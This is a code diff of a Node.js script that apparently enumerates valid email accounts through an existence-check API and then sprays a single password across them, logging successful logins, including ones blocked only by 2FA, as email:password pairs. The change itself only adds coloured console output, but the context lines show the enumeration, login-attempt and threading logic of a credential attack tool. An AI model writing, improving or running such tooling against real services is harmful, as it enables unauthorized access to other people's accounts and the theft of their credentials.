@@ -10,6 +10,11 @@ end_index = 0
 threads = 0
 threads_limit = 10
 
+FgRed = "\x1b[31m"
+FgGreen = "\x1b[32m"
+FgBlue = "\x1b[34m"
+FgCyan = "\x1b[36m"
+
 var pass = process.argv[3]
 var user_file = process.argv[2]
 
@@ -33,10 +38,10 @@ function is_email_valid(email){
   request(options, function (error, response, body) {
     let email_status = JSON.parse(body).IfExistsResult
     if(email_status == 0){
-      console.log(`[+] VALID_EMAIL: ${email}`)
+      console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
       is_password_valid(email)
     }else{
-      console.log(`[-] UNKNOWN_EMAIL: ${email}`)
+      console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
       threads -= 1
       thread_api()
     }
@@ -63,11 +68,11 @@ function is_password_valid(email){
   }
   request(options, function (error, response, body) {
     if(response.statusCode == 403){
-      console.log(`[+] SUCCESS (But 2FA): ${email}:${pass}`)
+      console.log(FgGreen, `[+] SUCCESS (But 2FA): ${email}:${pass}`)
     }else if(response.statusCode == 200){
-      console.log(`[+] SUCCESS: ${email}:${pass}`)
+      console.log(FgGreen, `[+] SUCCESS: ${email}:${pass}`)
     }else{
-      console.log(`[-] fail: ${email}:${pass}`)
+      console.log(FgRed, `[-] fail: ${email}:${pass}`)
     }
     threads -= 1
     thread_api()
